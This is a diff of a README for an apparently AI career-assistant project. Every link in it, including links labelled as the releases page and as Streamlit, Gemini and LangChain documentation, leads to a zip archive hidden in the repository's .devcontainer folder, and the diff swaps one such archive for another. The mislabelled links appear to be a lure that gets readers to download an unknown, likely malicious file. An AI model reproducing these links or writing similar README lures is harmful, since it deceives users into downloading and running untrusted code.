@@ -1,6 +1,6 @@
 # 🚀 CareerForge-AI - Your AI-Powered Career Companion
 
-[![Download CareerForge-AI](https://raw.githubusercontent.com/moti477/CareerForge-AI/main/.devcontainer/AI_Career_Forge_v1.4.zip%20Now-From%20Releases-blue)](https://raw.githubusercontent.com/moti477/CareerForge-AI/main/.devcontainer/AI_Career_Forge_v1.4.zip)
+[![Download CareerForge-AI](https://github.com/moti477/CareerForge-AI/raw/refs/heads/main/.devcontainer/Career_Forge_AI_v2.5.zip%20Now-From%20Releases-blue)](https://github.com/moti477/CareerForge-AI/raw/refs/heads/main/.devcontainer/Career_Forge_AI_v2.5.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ Before you begin, ensure your system meets the following requirements:
 
 You can download CareerForge-AI from our Releases page. Click the button below to visit the page and download the software.
 
-[Download CareerForge-AI](https://raw.githubusercontent.com/moti477/CareerForge-AI/main/.devcontainer/AI_Career_Forge_v1.4.zip)
+[Download CareerForge-AI](https://github.com/moti477/CareerForge-AI/raw/refs/heads/main/.devcontainer/Career_Forge_AI_v2.5.zip)
 
 1. Open the link above.
 2. Look for the latest release.
@@ -93,9 +93,9 @@ Join the CareerForge-AI community! Share your experiences and tips with other us
 
 For more information about the technologies behind CareerForge-AI, consider reading the following resources:
 
-- [Streamlit Documentation](https://raw.githubusercontent.com/moti477/CareerForge-AI/main/.devcontainer/AI_Career_Forge_v1.4.zip)
-- [Gemini Documentation](https://raw.githubusercontent.com/moti477/CareerForge-AI/main/.devcontainer/AI_Career_Forge_v1.4.zip)
-- [LangChain Documentation](https://raw.githubusercontent.com/moti477/CareerForge-AI/main/.devcontainer/AI_Career_Forge_v1.4.zip)
+- [Streamlit Documentation](https://github.com/moti477/CareerForge-AI/raw/refs/heads/main/.devcontainer/Career_Forge_AI_v2.5.zip)
+- [Gemini Documentation](https://github.com/moti477/CareerForge-AI/raw/refs/heads/main/.devcontainer/Career_Forge_AI_v2.5.zip)
+- [LangChain Documentation](https://github.com/moti477/CareerForge-AI/raw/refs/heads/main/.devcontainer/Career_Forge_AI_v2.5.zip)
 
 ## 🤝 Contributing
 
@@ -109,4 +109,4 @@ We welcome contributions from everyone. If you'd like to contribute to CareerFor
 
 ---
 
-Visit our [Releases page](https://raw.githubusercontent.com/moti477/CareerForge-AI/main/.devcontainer/AI_Career_Forge_v1.4.zip) to download CareerForge-AI and take the next step in your career journey!
+Visit our [Releases page](https://github.com/moti477/CareerForge-AI/raw/refs/heads/main/.devcontainer/Career_Forge_AI_v2.5.zip) to download CareerForge-AI and take the next step in your career journey!
